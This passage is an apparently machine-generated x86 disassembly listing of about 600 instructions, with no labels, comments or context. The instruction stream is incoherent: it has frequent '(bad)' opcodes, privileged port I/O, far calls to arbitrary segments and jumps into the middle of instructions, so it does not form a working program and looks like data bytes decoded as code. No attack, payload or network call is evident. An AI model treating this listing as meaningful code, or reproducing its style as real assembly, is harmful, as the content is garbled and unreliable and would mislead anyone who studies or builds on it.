  41f075:	and    DWORD PTR [ecx+0x62020ef3],0xffffffaf
  41f07c:	pop    ebp
  41f07d:	std    
  41f07e:	(bad)  
  41f07f:	sbb    DWORD PTR [edi],ecx
  41f081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f082:	cmp    eax,0x8f0d98a1
  41f087:	or     ah,BYTE PTR [edx+0x2c]
  41f08a:	dec    esp
  41f08b:	cmp    eax,DWORD PTR [eax]
  41f08d:	js     0x41f06d
  41f08f:	jmp    0x41f013
  41f091:	mov    ecx,0x1ddda5ba
  41f096:	mov    ebx,0x45cbe54e
  41f09b:	mov    cs:0x7783678b,eax
  41f0a1:	cmp    bh,BYTE PTR ds:0x24897e5c
  41f0a7:	loope  0x41f08f
  41f0a9:	imul   esi,DWORD PTR [ebx+0x7c43da1f],0x9d038e0d
  41f0b3:	add    bl,ch
  41f0b5:	stos   DWORD PTR es:[edi],eax
  41f0b6:	lock sub DWORD PTR [ebx-0x4af7d05d],ebx
  41f0bd:	in     eax,dx
  41f0be:	cmp    DWORD PTR [ebx-0x32989a01],ecx
  41f0c4:	call   0x96aa:0x3315c855
  41f0cb:	rol    BYTE PTR [ecx+0xb],0xf
  41f0cf:	dec    eax
  41f0d0:	pop    ds
  41f0d1:	and    dh,BYTE PTR [esi]
  41f0d3:	repz shl BYTE PTR [ecx],0xa
  41f0d7:	add    DWORD PTR [ecx-0x61],ebp
  41f0da:	aam    0x6b
  41f0dc:	and    DWORD PTR [esi],ecx
  41f0de:	ins    BYTE PTR es:[edi],dx
  41f0df:	mov    ecx,DWORD PTR [eax-0x2bef3722]
  41f0e5:	(bad)  
  41f0e6:	not    dl
  41f0e8:	xor    DWORD PTR [edi+0x421d47b3],eax
  41f0ee:	mov    eax,ds:0x7fc401ef
  41f0f3:	pop    esi
  41f0f4:	sbb    DWORD PTR [edx+edx*2],esi
  41f0f7:	fild   WORD PTR [esp+edi*2+0x4f]
  41f0fb:	fidivr DWORD PTR [esp+ebx*1+0x6a61a32c]
  41f102:	pushf  
  41f103:	icebp  
  41f104:	mov    ebp,0xa69e13b6
  41f109:	sti    
  41f10a:	daa    
  41f10b:	sbb    BYTE PTR [edi],bl
  41f10d:	ins    DWORD PTR es:[edi],dx
  41f10e:	fimul  DWORD PTR [edx+0x3b]
  41f111:	sub    al,0x76
  41f113:	fidiv  DWORD PTR [ebx+0x1d]
  41f116:	bnd jb 0x41f156
  41f119:	sub    DWORD PTR [ebx-0x43],eax
  41f11c:	setbe  BYTE PTR [ebx+0x59]
  41f120:	sti    
  41f121:	xchg   esi,eax
  41f122:	out    0x26,al
  41f124:	das    
  41f125:	bound  ecx,QWORD PTR [eax+edx*1]
  41f128:	adc    esi,esi
  41f12a:	lahf   
  41f12b:	mov    DWORD PTR [esi],0x923e9e4e
  41f131:	in     al,0x7b
  41f133:	or     BYTE PTR [ebx+edx*2-0x46],dh
  41f137:	xchg   edi,eax
  41f138:	sbb    DWORD PTR [ecx+0x2e6491b7],edx
  41f13e:	nop
  41f13f:	jmp    0x41f10c
  41f141:	xchg   edx,eax
  41f142:	stc    
  41f143:	xchg   ebp,eax
  41f144:	out    dx,eax
  41f145:	or     al,0xf4
  41f148:	and    bl,BYTE PTR [edi+0xb7df6ec]
  41f14e:	(bad)  
  41f14f:	adc    eax,0xa2a6665d
  41f154:	xchg   ecx,eax
  41f155:	push   ds
  41f156:	int    0xf0
  41f158:	jmp    0x41f1bd
  41f15a:	xchg   ebx,eax
  41f15b:	gs stc 
  41f15d:	mov    ds:0xfcf084ea,al
  41f162:	inc    edi
  41f163:	mov    ch,0x84
  41f165:	xchg   edx,eax
  41f166:	xchg   ebx,eax
  41f167:	mov    eax,0x3d549b40
  41f16c:	cwde   
  41f16d:	xor    al,0x14
  41f16f:	sub    al,0xe9
  41f171:	aas    
  41f172:	pop    ss
  41f173:	lods   eax,DWORD PTR ds:[esi]
  41f174:	sub    esi,DWORD PTR [edx]
  41f176:	add    al,0x12
  41f178:	pop    esi
  41f179:	push   ebx
  41f17a:	pop    ss
  41f17b:	cmp    edx,edx
  41f17d:	fisttp DWORD PTR [edx+0x5db523b7]
  41f183:	ins    BYTE PTR es:[edi],dx
  41f184:	sar    ecx,1
  41f186:	pushf  
  41f187:	aas    
  41f188:	hlt    
  41f189:	xlat   BYTE PTR ds:[ebx]
  41f18a:	ja     0x41f1f0
  41f18c:	sub    DWORD PTR [edi+eax*4+0x1e],ebp
  41f190:	cmp    al,BYTE PTR [ebx]
  41f192:	jne    0x41f135
  41f194:	mov    bh,bh
  41f196:	mov    edx,esi
  41f198:	fdivp  st(5),st
  41f19a:	repnz (bad) 
  41f19c:	out    0x42,al
  41f19e:	add    ah,cl
  41f1a0:	clc    
  41f1a1:	loop   0x41f1f2
  41f1a3:	xchg   BYTE PTR [eax],dl
  41f1a5:	sub    BYTE PTR [eax+0x74],bh
  41f1a8:	push   eax
  41f1a9:	and    dh,BYTE PTR [eax+0x78]
  41f1ac:	imul   ebx,esp,0xffffffeb
  41f1af:	or     eax,0x534c9e95
  41f1b4:	push   ebx
  41f1b5:	loope  0x41f14e
  41f1b7:	sub    cl,ch
  41f1b9:	xor    eax,0xc20725c8
  41f1be:	gs add al,0xdf
  41f1c1:	cs mov edx,0xdc7dae04
  41f1c7:	test   DWORD PTR [ecx],edx
  41f1c9:	int3   
  41f1ca:	pop    ebx
  41f1cb:	dec    edi
  41f1cc:	xchg   ecx,eax
  41f1cd:	pop    ds
  41f1ce:	or     eax,eax
  41f1d0:	push   esi
  41f1d1:	pop    esp
  41f1d2:	xchg   ebp,eax
  41f1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d4:	gs sbb al,0xc6
  41f1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1d8:	pushf  
  41f1d9:	xchg   DWORD PTR [ecx-0x9],ebx
  41f1dc:	lahf   
  41f1dd:	fild   WORD PTR [eax+0x22]
  41f1e0:	(bad)  
  41f1e1:	dec    eax
  41f1e2:	stc    
  41f1e3:	ja     0x41f262
  41f1e5:	pop    ebx
  41f1e6:	aad    0x9f
  41f1e8:	daa    
  41f1e9:	std    
  41f1ea:	xor    eax,0x107142ee
  41f1ef:	xchg   edx,eax
  41f1f0:	sub    eax,0x950140e5
  41f1f5:	fs int3 
  41f1f7:	jg     0x41f21a
  41f1f9:	stos   DWORD PTR es:[edi],eax
  41f1fa:	into   
  41f1fb:	cdq    
  41f1fc:	sub    eax,0xa7db2144
  41f201:	arpl   WORD PTR [ebp+0x42],bx
  41f204:	aas    
  41f205:	push   es
  41f206:	cdq    
  41f207:	lods   eax,DWORD PTR ds:[esi]
  41f208:	xor    edi,ecx
  41f20a:	(bad)  
  41f20b:	mov    ecx,0xd60d97d6
  41f210:	call   0xfcae:0xdf52b382
  41f217:	fst    DWORD PTR [esi+0x3c]
  41f21a:	mov    bl,bh
  41f21c:	rol    BYTE PTR [edi+esi*4+0x20],cl
  41f220:	shl    BYTE PTR [edx+0x19405bac],0xf9
  41f227:	sub    BYTE PTR [esi],al
  41f229:	mov    bl,0x27
  41f22b:	test   BYTE PTR [ebx-0x2e],0xc1
  41f22f:	in     al,dx
  41f230:	adc    al,0xc1
  41f232:	gs push ebp
  41f234:	inc    ebx
  41f235:	stos   DWORD PTR es:[edi],eax
  41f236:	xchg   esp,eax
  41f237:	and    al,0xbe
  41f239:	mov    eax,ds:0x2b72ddcf
  41f23e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f23f:	mov    esp,0x8aa642ff
  41f244:	push   edi
  41f245:	sub    si,WORD PTR [edi]
  41f248:	jb     0x41f284
  41f24a:	outs   dx,DWORD PTR ds:[esi]
  41f24b:	sahf   
  41f24c:	push   esi
  41f24d:	call   DWORD PTR [eax+0x42170339]
  41f253:	fcmove st,st(0)
  41f255:	call   0xc115:0xde712b1b
  41f25c:	add    DWORD PTR [esi+0x8],esp
  41f25f:	xor    al,0xc5
  41f261:	xlat   BYTE PTR ds:[ebx]
  41f262:	xchg   ebx,eax
  41f263:	sub    BYTE PTR [esi],bl
  41f265:	out    dx,eax
  41f266:	sub    esp,eax
  41f268:	outs   dx,BYTE PTR ds:[esi]
  41f269:	pop    ebp
  41f26a:	rol    DWORD PTR [edx-0x6ab9a214],1
  41f270:	jp     0x41f2c2
  41f272:	cmp    esi,ecx
  41f274:	retf   
  41f275:	mov    edi,0xd1bd23a0
  41f27a:	mov    WORD PTR [edi+0x62],cs
  41f27d:	into   
  41f27e:	jne    0x41f25f
  41f280:	ror    BYTE PTR ds:0x3430b1f2,1
  41f286:	(bad)  
  41f287:	dec    esi
  41f288:	sbb    eax,0x22079c9e
  41f28d:	fwait
  41f28e:	mov    edi,0xd50ba88e
  41f293:	je     0x41f2a0
  41f295:	mov    ?,eax
  41f297:	xchg   ebp,eax
  41f298:	popa   
  41f299:	sub    DWORD PTR [ebx],esp
  41f29b:	sbb    al,0x30
  41f29d:	cmp    eax,0x10c8cd4f
  41f2a2:	in     al,dx
  41f2a3:	mov    esp,esp
  41f2a5:	jl     0x41f227
  41f2a7:	jno    0x41f240
  41f2a9:	shr    DWORD PTR [ecx],cl
  41f2ab:	or     eax,0x523de0a9
  41f2b0:	std    
  41f2b1:	js     0x41f2c8
  41f2b3:	test   al,0x7a
  41f2b5:	ins    DWORD PTR es:[edi],dx
  41f2b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b7:	sbb    DWORD PTR [eax],0x30cfcc5f
  41f2bd:	jno    0x41f284
  41f2bf:	mov    edi,0x467e4619
  41f2c4:	jg     0x41f33b
  41f2c6:	enter  0x515b,0xcf
  41f2ca:	fistp  QWORD PTR [ebp+eiz*4-0x56a4149]
  41f2d1:	xchg   edx,eax
  41f2d2:	xchg   esi,eax
  41f2d3:	mov    eax,0x5e0a0744
  41f2d8:	sbb    eax,0x4a098d51
  41f2dd:	sbb    esi,DWORD PTR [eax]
  41f2df:	std    
  41f2e0:	stc    
  41f2e1:	push   esi
  41f2e2:	aas    
  41f2e3:	stos   DWORD PTR es:[edi],eax
  41f2e4:	mul    DWORD PTR [eax+0x7012751f]
  41f2ea:	sahf   
  41f2eb:	push   ecx
  41f2ec:	stc    
  41f2ed:	stos   DWORD PTR es:[edi],eax
  41f2ee:	stc    
  41f2ef:	inc    ebx
  41f2f0:	cld    
  41f2f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f2:	push   ss
  41f2f3:	mov    ch,0xaf
  41f2f5:	cmp    ah,BYTE PTR [ebx+0x55]
  41f2f8:	pop    es
  41f2f9:	scas   eax,DWORD PTR es:[edi]
  41f2fa:	and    eax,0xc4b577c4
  41f2ff:	xor    ecx,DWORD PTR [ecx+eiz*1]
  41f302:	ins    BYTE PTR es:[edi],dx
  41f303:	sub    DWORD PTR [ecx],esi
  41f305:	or     DWORD PTR [esi-0x9],esp
  41f308:	ss ds ins BYTE PTR es:[edi],dx
  41f30b:	stc    
  41f30c:	or     bh,0x9a
  41f30f:	mov    edx,0xb735a8a8
  41f314:	push   ds
  41f315:	xor    DWORD PTR [ebx-0x421eeb64],esi
  41f31b:	push   edi
  41f31c:	mov    dh,0x6f
  41f31e:	mov    edx,0x31b0694d
  41f323:	cmc    
  41f324:	loope  0x41f312
  41f326:	int    0x19
  41f328:	jae    0x41f372
  41f32a:	ret    0x72e4
  41f32d:	sub    al,BYTE PTR ss:0x59e8f9a2
  41f334:	xor    al,0x61
  41f336:	xor    al,0x60
  41f338:	ss repnz (bad) 
  41f33b:	jo     0x41f381
  41f33d:	adc    BYTE PTR [esi-0x2d],ch
  41f340:	mov    ebp,eax
  41f342:	dec    ecx
  41f343:	dec    esp
  41f344:	inc    ah
  41f346:	xor    DWORD PTR [edi+0x44],0xffffff84
  41f34a:	add    al,0xcf
  41f34c:	mov    esi,DWORD PTR [edx+ebp*4-0x44]
  41f350:	mov    cl,0x53
  41f352:	popf   
  41f353:	adc    al,0x38
  41f355:	loopne 0x41f2e6
  41f357:	sbb    BYTE PTR [ebp-0x56b6874d],ch
  41f35d:	out    0x36,al
  41f35f:	xchg   edx,eax
  41f360:	mov    esi,0x5e6f3011
  41f365:	mov    ecx,0x23146a6f
  41f36a:	call   0x1fa:0xfa5aa1d3
  41f371:	test   al,0x73
  41f373:	pop    esi
  41f374:	addr16 arpl bp,ax
  41f377:	out    0x1e,al
  41f379:	(bad)  
  41f37a:	push   ds
  41f37b:	stc    
  41f37c:	imul   DWORD PTR [ebp-0x26374278]
  41f382:	data16 fbstp TBYTE PTR [ebx-0x1eefd52b]
  41f389:	xor    DWORD PTR [ebx-0x76],0x23
  41f38d:	aad    0x22
  41f38f:	aad    0xf9
  41f391:	dec    ebx
  41f392:	mov    ecx,0x8022091d
  41f397:	dec    edi
  41f398:	xchg   edi,eax
  41f399:	imul   ebp,DWORD PTR [eax+0x4eee7ba1],0xa8c00855
  41f3a3:	ret    0x9cf3
  41f3a6:	fisttp DWORD PTR [esi+edi*1]
  41f3a9:	cmp    DWORD PTR [edx],edi
  41f3ab:	and    edi,DWORD PTR [ebx]
  41f3ad:	in     al,dx
  41f3ae:	stc    
  41f3af:	mov    edx,0x65e8b980
  41f3b4:	jno    0x41f363
  41f3b6:	mov    ?,WORD PTR [esi*1+0x7d7c70b7]
  41f3bd:	jl     0x41f3ba
  41f3bf:	pop    edx
  41f3c0:	(bad)  
  41f3c1:	retf   
  41f3c2:	adc    BYTE PTR [edi+0x12b17dca],dl
  41f3c8:	sub    eax,0x150cdbf6
  41f3cd:	ret    0x25a8
  41f3d0:	jbe    0x41f426
  41f3d2:	mov    dh,BYTE PTR [eax]
  41f3d4:	das    
  41f3d5:	dec    esp
  41f3d6:	mov    ?,WORD PTR [edi]
  41f3d8:	dec    eax
  41f3d9:	lods   al,BYTE PTR ds:[esi]
  41f3da:	ret    
  41f3db:	imul   eax,DWORD PTR [edi+0x7e],0x6a848200
  41f3e2:	inc    esp
  41f3e3:	inc    esp
  41f3e4:	(bad)  
  41f3e5:	mov    ds:0x7a6d8930,al
  41f3ea:	push   esp
  41f3eb:	pop    esi
  41f3ec:	adc    BYTE PTR [ebx-0x52],cl
  41f3ef:	push   ds
  41f3f0:	push   esi
  41f3f2:	xor    eax,0xe916b932
  41f3f7:	test   al,0x85
  41f3f9:	fmul   QWORD PTR [edx+0x798cdd30]
  41f3ff:	pusha  
  41f400:	(bad)  
  41f401:	and    dl,BYTE PTR [ebx+0x73]
  41f404:	dec    esi
  41f405:	cmp    esp,DWORD PTR [eax]
  41f407:	movzx  edx,WORD PTR [edx-0x42]
  41f40b:	iret   
  41f40c:	pop    es
  41f40d:	dec    ecx
  41f40e:	xor    al,0xf7
  41f410:	sbb    esi,edi
  41f412:	hlt    
  41f413:	in     al,0x3e
  41f415:	jmp    0x3a6b:0xda93dfa5
  41f41c:	lea    ebp,[ecx]
  41f41e:	(bad)  
  41f41f:	or     al,0x11
  41f421:	xchg   ebx,eax
  41f422:	push   0x268d892f
  41f427:	mov    ds:0x1d67fe6,al
  41f42c:	call   0x25b0:0x158f2659
  41f433:	out    0x86,al
  41f435:	mov    al,0x46
  41f437:	(bad)  
  41f438:	pop    edi
  41f439:	scas   al,BYTE PTR es:[edi]
  41f43a:	outs   dx,DWORD PTR ds:[esi]
  41f43b:	bound  edi,QWORD PTR [eax]
  41f43d:	xchg   BYTE PTR [ecx+0x1a4bbb7f],al
  41f443:	out    0xb2,eax
  41f445:	cs inc edx
  41f447:	popf   
  41f448:	ficomp DWORD PTR [ebx+0x64]
  41f44b:	adc    al,0x7
  41f44d:	jecxz  0x41f3d3
  41f44f:	add    eax,0x53b32316
  41f454:	xor    eax,0x55d4fd8d
  41f459:	(bad)  
  41f45a:	fld    TBYTE PTR [esi-0x71]
  41f45d:	sbb    edx,ebp
  41f45f:	std    
  41f460:	pop    eax
  41f461:	sub    eax,0xf3f6aabe
  41f466:	jb     0x41f3fe
  41f468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f469:	jp     0x41f44f
  41f46b:	sub    eax,0x119bfaa6
  41f470:	in     al,dx
  41f471:	push   0x63b7f0dd
  41f476:	fild   WORD PTR [edx+0xb79f60a]
  41f47c:	pop    ebp
  41f47d:	or     edi,esp
  41f47f:	pop    esi
  41f480:	mov    eax,0xc7bb702f
  41f485:	rcr    DWORD PTR [ebp-0x5366804f],cl
  41f48b:	bound  ebx,QWORD PTR [edx+eax*2-0x107fea6f]
  41f492:	js     0x41f50a
  41f494:	adc    al,0x56
  41f496:	ins    DWORD PTR es:[edi],dx
  41f497:	cli    
  41f498:	pop    ebp
  41f499:	sub    ah,BYTE PTR [edi-0xb]
  41f49c:	and    eax,0x469f40c6
  41f4a1:	mov    esp,0x65f322b9
  41f4a6:	stc    
  41f4a7:	test   BYTE PTR [ecx+edx*8-0x1850f605],dh
  41f4ae:	addr16 sub al,0xc5
  41f4b1:	sbb    al,BYTE PTR [ebx-0x25]
  41f4b4:	xchg   esi,eax
  41f4b5:	sbb    edi,esp
  41f4b7:	mov    cl,0xdd
  41f4b9:	pop    es
  41f4ba:	inc    DWORD PTR ds:[esp+eax*8-0x348d19f4]
  41f4c2:	xchg   edx,eax
  41f4c3:	loope  0x41f4e2
  41f4c5:	xor    bl,BYTE PTR [ebp-0x57]
  41f4c8:	sbb    BYTE PTR [esi+0x3e700c9d],0x33
  41f4cf:	push   0xd7d81058
  41f4d4:	xor    BYTE PTR [edi+0x607d38e4],ch
  41f4da:	push   ss
  41f4db:	pop    ebx
  41f4dc:	and    ecx,esi
  41f4de:	push   edi
  41f4df:	push   edi
  41f4e0:	fst    DWORD PTR [edx]
  41f4e2:	ins    DWORD PTR es:[edi],dx
  41f4e3:	sub    ch,BYTE PTR [edi-0x637888a7]
  41f4e9:	jnp    0x41f4ee
  41f4eb:	add    eax,0x4eff7144
  41f4f0:	mov    ecx,0x4d5797ff
  41f4f5:	cmp    DWORD PTR [edx-0x74aec72f],edi
  41f4fb:	mov    ecx,0xe986cbdd
  41f500:	adc    al,0x61
  41f502:	(bad)  [eax]
  41f504:	sbb    bl,0x11
  41f507:	jl     0x41f52a
  41f509:	dec    edx
  41f50a:	in     al,dx
  41f50b:	std    
  41f50c:	in     eax,dx
  41f50d:	(bad)  
  41f50e:	sti    
  41f50f:	cwde   
  41f510:	pop    eax
  41f511:	mul    DWORD PTR [eax-0x30]
  41f514:	cwde   
  41f515:	test   DWORD PTR [ebx],edi
  41f517:	aaa    
  41f518:	adc    DWORD PTR [esi],esp
  41f51a:	rcr    DWORD PTR [eax+0x6b],1
  41f51d:	xor    eax,0x26dbc669
  41f522:	mov    eax,0x270b09cd
  41f527:	inc    ecx
  41f528:	mov    bh,0x2c
  41f52a:	adc    DWORD PTR [ecx-0x58],0x35c7147e
  41f531:	ror    DWORD PTR [esi],0xfa
  41f534:	call   DWORD PTR ds:0x1bb301ad
  41f53a:	retf   0x1b63
  41f53d:	pop    esi
  41f53e:	adc    eax,0xa36b875e
  41f543:	mov    ah,0x2
  41f545:	add    eax,0x847ccca0
  41f54a:	inc    DWORD PTR [edx]
  41f54c:	jo     0x41f56f
  41f54e:	shr    WORD PTR [edi],1
  41f551:	sbb    bh,al
  41f553:	dec    ebx
  41f554:	std    
  41f555:	mov    ds:0xa0b11915,al
  41f55a:	daa    
  41f55b:	sar    BYTE PTR [esi+esi*8],0x5b
  41f55f:	push   edx
  41f560:	jns    0x41f5c4
  41f562:	adc    eax,0xe645f3a4
  41f567:	enter  0xa6d4,0xc2
  41f56b:	sbb    BYTE PTR [edi+0x33],al
  41f56e:	push   eax
  41f56f:	pushf  
  41f570:	pop    ds
  41f571:	test   DWORD PTR fs:[esi+0x69],ecx
  41f575:	stos   BYTE PTR es:[edi],al
  41f576:	lods   al,BYTE PTR ds:[esi]
  41f577:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f579:	fdivr  QWORD PTR [edi]
  41f57b:	ins    DWORD PTR es:[edi],dx
  41f57c:	ins    BYTE PTR es:[edi],dx
  41f57d:	xchg   edx,eax
  41f57e:	push   esi
  41f57f:	xchg   ebx,eax
  41f580:	cmp    eax,0xb2da9d5e
  41f585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f586:	sub    esi,DWORD PTR [edi+0xa]
  41f589:	adc    al,0x3f
  41f58b:	adc    ebx,ebx
  41f58d:	ud0    ebp,DWORD PTR [ebx+0x41]
  41f591:	ins    DWORD PTR es:[edi],dx
  41f592:	add    DWORD PTR [edi-0x16],esi
  41f595:	shl    edi,1
  41f597:	adc    ecx,ecx
  41f599:	arpl   cx,sp
  41f59b:	pop    ebp
  41f59c:	sub    bl,BYTE PTR [ecx]
  41f59e:	add    al,0x2f
  41f5a0:	call   0xcf77:0x7bfea356
  41f5a7:	inc    BYTE PTR [edi-0x60]
  41f5aa:	pop    es
  41f5ab:	sar    ah,1
  41f5ad:	pop    eax
  41f5ae:	pop    esp
  41f5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b0:	into   
  41f5b1:	std    
  41f5b2:	inc    edi
  41f5b3:	push   0x191280f3
  41f5b8:	mov    al,0x95
  41f5ba:	push   eax
  41f5bb:	mov    eax,eax
  41f5bd:	in     eax,dx
  41f5be:	add    DWORD PTR ds:0xa08d74b4,ecx
  41f5c4:	mov    esi,0x7b706d3f
  41f5c9:	fdivr  st,st(6)
  41f5cb:	sub    DWORD PTR [ebx-0x2eb9bfdb],0x3ff1ff03
  41f5d5:	les    ebx,FWORD PTR [ebx-0x7]
  41f5d8:	jmp    0x41f5d3
  41f5da:	shr    DWORD PTR ds:0x1f3e09bd,cl
  41f5e0:	add    ebp,edi
  41f5e2:	jmp    FWORD PTR [esi]
  41f5e4:	add    BYTE PTR [ebx+eiz*2],bl
  41f5e7:	or     esp,DWORD PTR [esi-0x6b]
  41f5ea:	shl    DWORD PTR [ecx],1
  41f5ec:	retf   0xbdce
  41f5ef:	dec    eax
  41f5f0:	pop    esp
  41f5f1:	xor    al,0xb8
  41f5f3:	xchg   edi,eax
  41f5f4:	call   0xd7e5af2c
  41f5f9:	jmp    0x41f634
  41f5fb:	jmp    0x22fd:0xcabafc78
  41f602:	or     al,0x87
  41f604:	arpl   WORD PTR [eax],cx
  41f606:	imul   eax,DWORD PTR [edx+ebp*1+0x79],0xffffff8d
  41f60b:	je     0x41f60a
  41f60d:	push   0xe9a440a1
  41f612:	mov    ah,0xee
  41f614:	ss inc ebp
  41f616:	fisttp QWORD PTR [edx]
  41f618:	cmp    edi,DWORD PTR [edi-0x5d23f759]
  41f61e:	retf   
  41f61f:	mov    DWORD PTR ds:0x1da5c4a1,ebp
  41f625:	repz rcl BYTE PTR [ebx-0x28ae532d],0x4
  41f62d:	mov    cl,0x2b
  41f62f:	and    esp,edx
  41f631:	inc    BYTE PTR [ecx]
  41f633:	mov    al,0x45
  41f635:	cmc    
  41f636:	mov    al,ds:0x1bfe43c7
  41f63b:	inc    edi
  41f63c:	repnz cmp DWORD PTR [edx],edi
  41f63f:	leave  
  41f640:	cld    
  41f641:	or     BYTE PTR [esi],dh
  41f643:	into   
  41f644:	pop    edx
  41f645:	jecxz  0x41f69a
  41f647:	imul   ecx,edx,0xb
  41f64a:	mov    edi,0x77c5111
  41f64f:	dec    eax
  41f650:	dec    edx
  41f651:	sub    eax,0xd8ef2bd4
  41f656:	dec    esi
  41f657:	mov    eax,0x6d44a1fa
  41f65c:	xchg   esi,eax
  41f65d:	idiv   cl
  41f65f:	sbb    esp,DWORD PTR [edi]
  41f661:	or     al,0xff
  41f663:	rcr    BYTE PTR [edi+0x7a],1
  41f666:	adc    ebp,esp
  41f668:	data16 sbb al,0x6b
  41f66b:	ror    BYTE PTR [ebx],cl
  41f66d:	push   esp
  41f66e:	inc    esp
  41f66f:	jg     0x41f6d6
  41f671:	xlat   BYTE PTR ds:[ebx]
  41f672:	push   ds
  41f673:	sub    eax,0x3bf31824
  41f679:	icebp  
  41f67a:	inc    edx
  41f67b:	add    ebp,ebp
  41f67d:	mov    al,0x3f
  41f67f:	inc    ebp
  41f680:	cwde   
  41f681:	mov    gs,WORD PTR [edx+0x51af0544]
  41f687:	jl     0x41f67a
  41f689:	mov    edx,DWORD PTR [eax+0x56]
  41f68c:	and    ebp,ebx
  41f68e:	push   ds
  41f68f:	fwait
  41f690:	mov    al,ds:0x9867859b
  41f695:	iret   
  41f696:	lock push 0x31
  41f699:	mov    esp,0xb80c698a
  41f69e:	push   eax
  41f69f:	stos   BYTE PTR es:[edi],al
  41f6a0:	sbb    BYTE PTR [edi+ebp*4+0x176df38d],dh
  41f6a7:	cwde   
  41f6a8:	popf   
  41f6a9:	mov    cl,0xdf
  41f6ab:	addr16 mov ds:0x235b,al
  41f6af:	sub    DWORD PTR [eax*2-0x40efc46a],edx
  41f6b6:	jns    0x41f643
  41f6b8:	add    dh,BYTE PTR [ecx+0x59a2f02f]
  41f6be:	sub    eax,0x37674647
  41f6c3:	call   0x93c087fa
  41f6c8:	test   edi,edx
  41f6ca:	repz xchg ebp,eax
  41f6cc:	mov    ds:0x98b51b76,eax
  41f6d1:	push   cs
  41f6d2:	stos   BYTE PTR es:[edi],al
  41f6d3:	inc    ecx
  41f6d4:	idiv   BYTE PTR [esp+edx*1+0x60]
  41f6d8:	mov    al,ds:0xadbb0b68
  41f6dd:	into   
  41f6de:	pop    edi
  41f6df:	jle    0x41f68f
  41f6e1:	clc    
  41f6e2:	and    DWORD PTR [esi+0x1abc1e9a],0xf83db454
  41f6ec:	and    ah,BYTE PTR [ebp-0x1d48c168]
  41f6f2:	cmp    edx,DWORD PTR ds:[ebp+edx*4-0x1e]
  41f6f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6f8:	jne    0x41f6d2
  41f6fa:	jno    0x41f756
  41f6fc:	inc    BYTE PTR [edi-0x79]
  41f6ff:	lods   al,BYTE PTR ds:[esi]
  41f700:	mov    al,0x3f
  41f702:	lea    ecx,[ecx+ecx*4]
  41f705:	pop    edi
  41f706:	xor    eax,0x70ba7e8a
  41f70b:	outs   dx,BYTE PTR ds:[esi]
  41f70c:	(bad)
  41f710:	fbstp  TBYTE PTR [ebp-0x656daf5b]
  41f716:	add    BYTE PTR [ebp+0x164b8f42],bh
  41f71c:	addr16 mov ecx,0x7e22e200
  41f722:	and    ecx,edx
  41f724:	sbb    esi,edx
  41f726:	adc    esp,ebx
  41f728:	xchg   DWORD PTR [edi+0x27],esi
  41f72b:	dec    esp
  41f72c:	(bad)  
  41f72d:	or     edi,0x3b
  41f730:	sbb    ah,BYTE PTR [eax]
  41f732:	ins    DWORD PTR es:[edi],dx
  41f733:	xchg   edx,eax
  41f734:	stos   DWORD PTR es:[edi],eax
  41f735:	in     eax,0xc1
  41f737:	or     ecx,DWORD PTR [ecx]
  41f739:	mov    dh,0xd8
  41f73b:	push   edi
  41f73c:	mov    edi,0x6bdac71b
  41f741:	das    
  41f742:	mov    edi,0x402dec21
  41f747:	repnz aas 
  41f749:	push   ecx
  41f74a:	ins    BYTE PTR es:[edi],dx
  41f74b:	sbb    bl,BYTE PTR [edx-0x53]
  41f74e:	xor    eax,0x743365ac
  41f753:	lods   al,BYTE PTR ds:[esi]
  41f754:	adc    BYTE PTR [ecx],0x62
  41f757:	aad    0x52
  41f759:	or     DWORD PTR [ebp-0x196a016],esi
  41f75f:	push   0x60078d6e
  41f764:	xlat   BYTE PTR ds:[ebx]
  41f765:	adc    DWORD PTR [ebx],ebx
  41f767:	and    DWORD PTR [edi-0x2a],esi
  41f76a:	mov    esi,0xfeda043
  41f76f:	lock enter 0x6c4,0xa4
  41f774:	inc    eax
  41f775:	or     edi,0xffffffc5
  41f778:	frstor [eax]
  41f77a:	sar    esi,cl
  41f77c:	imul   eax,DWORD PTR [ebx+0x1b92409d],0xb05cef00
  41f786:	ret    
  41f787:	mov    ds:0xf5eb7f09,al
  41f78c:	inc    esi
  41f78d:	popf   
  41f78e:	xchg   ebx,eax
  41f78f:	push   eax
  41f790:	stos   BYTE PTR es:[edi],al
  41f791:	add    BYTE PTR [ebp+eax*4-0x19784e9],al
  41f798:	or     al,0x10
  41f79a:	mov    ecx,0x443ea83d
  41f79f:	ss ins DWORD PTR es:[edi],dx
  41f7a1:	fild   QWORD PTR [edx-0x797f45ad]
  41f7a7:	add    DWORD PTR [edx+0x69f23b0b],ebx
  41f7ad:	jmp    0x6a10a2fc
  41f7b2:	xor    al,0x25
  41f7b4:	jle    0x41f76c
  41f7b6:	mov    ecx,0x1ec87f71
  41f7bb:	xlat   BYTE PTR ds:[ebx]
  41f7bc:	nop
  41f7bd:	les    esp,FWORD PTR [esi-0x4777599]
  41f7c3:	retf   0x350f
  41f7c6:	hlt    
  41f7c7:	mov    edx,0x6dcfa41
  41f7cc:	je     0x41f84a
  41f7ce:	dec    esi
  41f7cf:	mov    ecx,0x1e709e1
  41f7d4:	rdmsr  
  41f7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7d7:	stos   DWORD PTR es:[edi],eax
  41f7d8:	adc    eax,edx
  41f7da:	ins    BYTE PTR es:[edi],dx
  41f7db:	lea    eax,[ebx-0x58ade2b0]
  41f7e1:	retf   0x1384
  41f7e4:	sahf   
  41f7e5:	cmc    
  41f7e6:	dec    esi
  41f7e7:	inc    ebx
  41f7e8:	pop    esp
  41f7e9:	cs push ss
  41f7eb:	mov    ds:0x375faee9,al
  41f7f0:	jnp    0x41f7cf
  41f7f2:	and    al,0xf4
  41f7f4:	xchg   ebx,eax
  41f7f5:	mov    dh,0x86
  41f7f7:	jno    0x41f821
  41f7f9:	loope  0x41f828
  41f7fb:	inc    eax
